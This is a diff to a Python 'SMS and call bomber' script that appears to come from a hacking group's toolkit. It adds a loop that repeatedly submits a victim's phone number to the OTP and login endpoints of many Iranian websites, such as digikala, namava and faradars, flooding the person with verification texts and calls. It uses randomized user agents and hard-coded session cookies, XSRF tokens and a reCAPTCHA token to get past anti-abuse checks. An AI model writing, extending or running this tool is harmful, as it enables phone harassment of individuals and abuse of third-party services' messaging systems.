@@ -320,7 +320,7 @@ def SMS_BOMBER():
         response = requests.post('https://api.mohit.online/api/auth/login', headers=headers, json=json_data)
         if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
         else : print(f"{R}{w}NOT SEND SMS :(")
-        ############################### n ###############################
+        ############################### melico ###############################
         headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
             'Content-Type': 'application/json','Referer': 'https://my.melico.ir/','Origin': 'https://my.melico.ir','Sec-Fetch-Dest': 'empty',
             'Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Connection': 'keep-alive','Priority': 'u=0',}
@@ -328,7 +328,7 @@ def SMS_BOMBER():
         response = requests.post('https://melico.ir/auth/check-user', headers=headers, json=json_data)
         if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
         else : print(f"{R}{w}NOT SEND SMS :(")
-        ############################### n ###############################
+        ############################### erythron ###############################
         headers = {'User-Agent': USERS.r_ua(),'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5',
             'Content-Type': 'application/json','Origin': 'https://dashboard.erythron.net','Connection': 'keep-alive',
             'Referer': 'https://dashboard.erythron.net/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
@@ -420,12 +420,133 @@ def SMS_BOMBER():
         response = requests.post('https://api.ibime.com/web/v1/account/otp', headers=headers, json=json_data)
         if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
         else : print(f"{R}{w}NOT SEND SMS :(")
-        ############################### Shad ###############################
+        ############################### erythron SMS###############################
+        headers = {'User-Agent': USERS.r_ua(),'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/json','Origin': 'https://dashboard.erythron.net','Connection': 'keep-alive',
+            'Referer': 'https://dashboard.erythron.net/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-site','Priority': 'u=0',}
+        json_data = {'auth_type': 'mobile','auth_value': Phone_NOMBER,}
+        response = requests.post('https://api.erythron.net/v1/user/getVerifyCode', headers=headers, json=json_data)
+        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
+        else : print(f"{R}{w}NOT SEND SMS :(")
 
 def Both_BOMBER():
     Phone_NOMBER = input(F"{g}Enter Nomber For SMS and CALL BOMBER : \n  For example : 09123456789 \n  $-")
     Both = input(F"\n\nEnter Nomber Send SMS and CALL : ")
     print("\n!!For Stop enter ctrl+C !!\n")
+    for i in range(int(int(Both))):
+        ############################### tetherland CALL###############################
+        headers = {
+            'User-Agent': USERS.r_ua(),
+            'Accept': 'application/json','Accept-Language': 'en-US,en;q=0.5','Content-Type': 'application/json',
+            'Referer': 'https://app.tetherland.com/','Origin': 'https://app.tetherland.com','Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Connection': 'keep-alive','Priority': 'u=0',
+        }
+        json_data = {'mobile': Phone_NOMBER,
+            'device_info': {'brand': '','model': '','browserVersion': '432.0','app_version': '','by': 'web','osName': 'kali',
+            'osVersion': 'XP','browserName': 'TOR','platform': 'web','name': 'TEMOX','device': 'web',
+            },'otp_type': 'call',
+            'device': 'web',
+        }
+        response = requests.post('https://service.tetherland.com/api/v5/login-register', headers=headers, json=json_data)
+        if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
+        else : print(f"{R}{w}NOT SEND CALL :(")
+        ############################### shabdiz SMS###############################
+        headers = {'User-Agent': USERS.r_ua(),'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5',
+            'Referer': 'https://www.shabdizgroup.com/','Origin': 'https://www.shabdizgroup.com',
+            'Connection': 'keep-alive','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site',}
+        params = {'phoneNumber': Phone_NOMBER,}
+        response = requests.get('https://paneladmin.shabdizgroup.com/api/App/RequestVerifyCode', params=params, headers=headers)
+        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
+        else : print(f"{R}{w}NOT SEND SMS :(")
+        ############################### ibime SMS###############################
+        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/json','Origin': 'https://ibime.com','Connection': 'keep-alive','Referer': 'https://ibime.com/',
+            'Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Priority': 'u=0',}
+        json_data = {'phoneNumber': Phone_NOMBER,}
+        response = requests.post('https://api.ibime.com/web/v1/account/otp', headers=headers, json=json_data)
+        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
+        else : print(f"{R}{w}NOT SEND SMS :(")
+        ############################### banimode SMS###############################
+        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/json;charset=utf-8','platform': 'TOR','Origin': 'https://www.banimode.com',
+            'Connection': 'keep-alive','Referer': 'https://www.banimode.com/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-site','Priority': 'u=0',}
+        json_data = {'phone': Phone_NOMBER,}
+        response = requests.post('https://mobapi.banimode.com/api/v2/auth/request', headers=headers, json=json_data)
+        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
+        else : print(f"{R}{w}NOT SEND SMS :(")
+        ############################### vitrin CALL###############################
+        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json','Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/json','V-Session-ID': 'f06009c5-70d9-448e-b413-035e61a952fe','V-Fingerprint-ID':
+            'f0e133830f31be0bffd26154f5ac7f0d','X-XSRF-TOKEN': 
+            'eyJpdiI6ImVvVVF1bzlWd2tyR3lyNlpEMUU1M3c9PSIsInZhbHVlIjoiUHBMWTN4clQ4Nk9OV1F1b1VuOU4xdHo3cEdzVVJkN2RoQUpvQS9Zc3JZK3hFZm90azBpWEhDYlA1ekFVL21jbldWRWREWUtPc3lubXZ5cUZRQjFPajR0NjBnVmZNRE5NVkFHaE44WjRoNy9BSEpncXRqRW9Eem92WXVqMGFmU0IiLCJtYWMiOiI2MjNjMWM2M2FmYjIwNWJkYmY2MWU0MzdhNDZjZmI2NjY0Y2RkMDg5OGZhOWE2MDFjZGE3ODgzMWY4OGEwODVmIiwidGFnIjoiIn0=',
+            'Origin': 'https://www.vitrin.shop','Alt-Used': 'www.vitrin.shop','Connection': 'keep-alive','Referer':
+            'https://www.vitrin.shop/login','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Priority': 'u=0',}
+        json_data = {
+            'phone_number': USERS.r_ua(),
+            'forgot_password': False,}
+        response = requests.post('https://www.vitrin.shop/api/v1/user/request_code', headers=headers, json=json_data)
+        if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
+        else : print(f"{R}{w}NOT SEND CALL :(")
+        ############################### faradars SMS###############################
+        cookies = {
+            '_ga_MCXYH70MBX': 'GS1.1.1716381662.1.1.1716381703.0.0.0',
+            '_ga': 'GA1.2.8330733.1716381663',
+            '_ga_1SSNSBRK00': 'GS1.1.1716381663.1.1.1716381703.0.0.0',
+            '_clck': '1uxxq72%7C2%7Cflz%7C0%7C1603',
+            '_clsk': 'qhq9gz%7C1716381703881%7C3%7C1%7Cz.clarity.ms%2Fcollect',
+            'laravel_session': 'eyJpdiI6InRpZUVuTmFib0VoOEZNL1VhV2l4cFE9PSIsInZhbHVlIjoiMzV3UjdrNzhFTW1WVmVobUZWMXgvd2ljdHI2eXZBdzlEd09BYlVXM1AydTd0QzdpSk9HMW0zcy9nZFRWZnV6clAxM3dmbWNEWVIwWCtIUSs4dENwWkJSTEZsOUVZUUllTVF3Vmk1emdXS3pIOGp0V3M1RjhDdkk4cTNBOUVTZ3YiLCJtYWMiOiI2NGE1YzRmNjVjZWQyOTI1M2NjNTkyNjkzNTA1NGMyMmVlYjJmNDdhNmVmNzYzODU3MzQ1NzdlMDU4M2ZmMzYzIiwidGFnIjoiIn0%3D',
+            'fara_dars_guest_shopping_cart_04a036a898e2a750d91742f88b2d8599': 'Yk5XNTgwL21sVHlYSFpOY3pSOVhBazdqbkY0S3Ntc3M2cGJrZnRmRm1CU2dIbTBCVkM4a3A5OFZNQUhBc1FHWQ%3D%3D',
+            '_gid': 'GA1.2.789109954.1716381702',
+            '_gat_gtag_UA_50789780_1': '1',
+            '_hjSessionUser_3638482': 'eyJpZCI6ImUzNTQzZTQzLTZjYzQtNWY2Ny04ZTBmLTA3NWZjZTY5MjA0NiIsImNyZWF0ZWQiOjE3MTYzODE3MDQ2MzAsImV4aXN0aW5nIjpmYWxzZX0=',
+            '_hjSession_3638482': 'eyJpZCI6IjU4NGUwNzRjLWM4YTktNDhjZS1iZmQ5LTNiYWI5Y2Y4NDc1YiIsImMiOjE3MTYzODE3MDQ2MzEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',}
+        headers = {
+            'User-Agent': USERS.r_ua(),'Accept': 'application/json','Accept-Language': 'EN','Content-Type': 'application/json',
+            'Nextjs': 'true','Current-Url': 'https://faradars.org/register','Origin': 'https://faradars.org','Connection': 'keep-alive',
+            'Referer': 'https://faradars.org/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site',}
+        json_data = {'mobile': Phone_NOMBER,
+            'g-recaptcha-response-v3': '03AFcWeA7KhJEAQjyWzwyTbSyYR52rJMJgXekgy2U-8-cUVZIYt2mDcOALct9r5D7iTb7vqbtw1RKSZstIkf8FEAOMj9hVTp18oEnnRA87sa1_ky3BLwnA8MPLOmNLjlFdy2Hjqj53LMnP5zWIdIq1WphjibicA5krlxGAyb2pTkZ_qNfT-lF4UiZU38N0Vsd8Vqdg1kJUaDGVkXSj_6BvJTB-IgQmFTxk3YaRrKfQTtrvKjkKPuOn5daqOSvHv3_UE5CPOcUV4_0gjAiRrlsF-l9hKkdSFH_BmbL166WFRaTXHKASE0Qnd5rBdzJZHs_CDK7-xa6_Ym-jN2dlA5NqDUyjowtNOEY6zSEFDIMlx8LkR_ObH8AEbpXo_JsUUjVS16hqgqgJl4Cdzn4iXQfM_Ha5PUQqO_WljYfbdsbD9vb9yEuH7CE1XybP7VNTUF0yIB_lcaSlI0CJxPF5rFuNQUNgUvGvYQFsN-p-LGJBD_rnT8zXxwvakkoh_cxmB3K6fWOaNTQ05yKSGSc2n07nKVDF8pzIhvTfFAFU3QMqjy0Oh-1werTscoeJPDa3POh1BuT4-uzXj-JVtdR7ZIXZTYkWyhi7ontIa6jVXbAbZ3PbnqB-BJhvMDbHRHD3sfPM0zRjQRuHKZFsUOLMIEAxB33jzf5Z9QQo8Q',
+            'digits': 5,'platforms': 'web','source': 'faradars',}
+        response = requests.post('https://api.faradars.org/api/client/v1/auth/otp', cookies=cookies, headers=headers, json=json_data)
+        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
+        else : print(f"{R}{w}NOT SEND SMS :(")
+        ############################### namava SMS###############################
+        cookies = {'use_legacy_player': 'false','dv-v3': '{"g":"desktop","platform":null}',
+            'guest_token': '0368F2A8BCFEFFEDF881E8B1D7B63F7C2E270B1BC6D84C21661AFCAACD87611963C159B9D9F97999F097A2012431CFA1F571E927A860B13EBD619FBBB9A15D7192B4EB7427DE1631BBA7B6E18CBF1410ED8DFA9548CA1F6B8F205BECD8123B704B483EF87AC52EC5DA4E913A994DD69AADAA10BE14561A60B8CD21663B1F86E20B987FFFB04E76E4880D6EC4F58531038393E65B8F1E1276D45C1A39B1CD09CAF91C995AFA26350A1AA66B921174B90E09F8A3F4DCABB7FFC19140E1C0F62BEE1E669BB3E65059664CF0FF710BB85EBC75750D82D76C697595302196117A90A1F317B4EDD6CE757DA7A1D9BC1C5D3642062096E5FF97E76D0DE6B7C4187ECBB5',
+            'anonymous_login': 'true','_clck': '3i1wnq%7C2%7Cflz%7C0%7C1603','_ga': 'GA1.2.15020820.1716382006',
+            '_gid': 'GA1.2.343377359.1716382006','analytics_session_token': '7a7972f5-83c4-9df7-8d34-803934ea2b69',
+            'analytics_token': 'e24f424b-f88f-957b-c1d4-b76a251e506c','yektanet_session_last_activity': '5/22/2024','_yngt_iframe': '1',
+            '_ga_9XXJ5QGRKG': 'GS1.2.1716382007.1.1.1716382312.31.0.0','_yngt': 'a7f00977-71cf2-24d3f-f1766-6f8787595a1aa',
+            '_ga_X8RD5LS5K2': 'GS1.1.1716382009.1.1.1716382303.0.0.0','_clsk': '15384v8%7C1716382303413%7C4%7C1%7Cwww.clarity.ms%2Feus2-c%2Fcollect',
+            'auth_nounce': 'YWENFvF1pH5DZkt3lvJ_c1ezUjGfyF1zaLUNvAh2t-rXDDDBi26VKUbji7yLTLLP2btkbVMigz55ACbxIpWMAA2',}
+        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/json;charset=utf-8','X-Application-Type': 'WebClient','X-Client-Version': '2.64.0',
+            'X-Auth-Token': '0368F2A8BCFEFFEDF881E8B1D7B63F7C2E270B1BC6D84C21661AFCAACD87611963C159B9D9F97999F097A2012431CFA1F571E927A860B13EBD619FBBB9A15D7192B4EB7427DE1631BBA7B6E18CBF1410ED8DFA9548CA1F6B8F205BECD8123B704B483EF87AC52EC5DA4E913A994DD69AADAA10BE14561A60B8CD21663B1F86E20B987FFFB04E76E4880D6EC4F58531038393E65B8F1E1276D45C1A39B1CD09CAF91C995AFA26350A1AA66B921174B90E09F8A3F4DCABB7FFC19140E1C0F62BEE1E669BB3E65059664CF0FF710BB85EBC75750D82D76C697595302196117A90A1F317B4EDD6CE757DA7A1D9BC1C5D3642062096E5FF97E76D0DE6B7C4187ECBB5',
+            'Origin': 'https://www.namava.ir','Connection': 'keep-alive','Referer': 'https://www.namava.ir/auth/register-phone',
+            'Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin',}
+        json_data = {'UserName': "+98"+Phone_NOMBER[1:],}
+        response = requests.post('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request',
+            cookies=cookies,headers=headers,json=json_data,)
+        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
+        else : print(f"{R}{w}NOT SEND SMS :(")
+        ############################### digikala CALL###############################
+        cookies = {'_sp_ses.13cb': '*',
+            '_sp_id.13cb': '61e94fa0-5aa7-4285-9b6f-ce4b803ce271.1716379964.1.1716379977..e384d6ca-b1db-4721-830a-cfdcd7b8ce4e..ceb21d11-1f69-4c9a-9d4e-f8f1a7c97321.1716379963875.10',
+            'tracker_glob_new': 'ciewu5l','tracker_session': '67dWL5g',
+            'TS01c77ebf': '0102310591f244d51ddc52bfd04667750d1f725ffd622e78cfa9e082d3bb09fcb31428e5deb0c512ef587fd539eb24356a941d0f3a809ae9595f99fda20f00ab669f9cf59b',
+            'TS01b6ea4d': '01023105919be6b3f1260381dd1528074f4c53f743622e78cfa9e082d3bb09fcb31428e5defbcb1143435583a505556ef8f47251de02233d5f52e4ec5bc17f030546505439cff876c305d5eb3c387948c931aeaa0c',
+            'ab_test_experiments': '%5B%228b29e3376be23005993b066a7741e54e%22%2C%22229ea1a233356b114984cf9fa2ecd3ff%22%2C%22ce9358448bd487c71527b7c18d634fd1%22%2C%22e9ade66cadf2633c074b2cee1e403034%22%5D',
+            '_ga_QQKVTD5TG8': 'GS1.1.1716379968.1.1.1716379978.0.0.0','_ga': 'GA1.1.1878235439.1716379968',}
+        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/json','Referer': 'https://www.digikala.com/','X-Web-Optimize-Response': '1',
+            'X-Web-Client': 'kali','Origin': 'https://www.digikala.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-site','Connection': 'keep-alive',}
+        json_data = {'backUrl': '/','username': Phone_NOMBER,'otp_call': True,}
+        response = requests.post('https://api.digikala.com/v1/user/authenticate/', cookies=cookies, headers=headers, json=json_data)
+        if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
+        else : print(f"{R}{w}NOT SEND CALL :(")
 
 def SEE_WE():
     print(f"""\n\n\n\n\n\n\n
@@ -434,8 +555,8 @@ def SEE_WE():
 A channel for education - news - tricks - hacking - Kali and Termux tools
 With support for three languages: English, Persian and Arabic
 
-{}Telegram -> @Grup_Hacking_Cactus_Black
-{}YouTube  -> @Grup_Hacking_Cactus_Black""")
+{B}Telegram ->\n {R}{y}@Grup_Hacking_Cactus_Black
+{B}YouTube  ->\n {R}{y}@Grup_Hacking_Cactus_Black\n""")
     input("enter 01010110001")
     main()
 
@@ -458,4 +579,6 @@ def main():
     if USE_OF == 3 : Both_BOMBER()
     if USE_OF == 4 : SEE_WE()
     if USE_OF == 5 : exit()
+
+
 main()
